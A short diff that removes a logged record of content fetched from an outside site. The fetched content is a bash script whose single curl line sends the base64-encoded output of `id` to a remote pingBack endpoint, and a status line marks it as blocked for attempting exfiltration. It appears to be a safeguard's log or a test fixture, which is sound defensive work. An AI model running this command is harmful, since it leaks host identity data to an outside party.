@@ -1,7 +1,0 @@
-Fetched content from https://www.adami.pl/crsr/code:
-
-#!/bin/bash
-curl "https://www.adami.pl/pingBack?x=$(id|base64)"
-
-Execution status: BLOCKED
-Reason: Script attempts to exfiltrate host identity data via network request and was not executed for security.
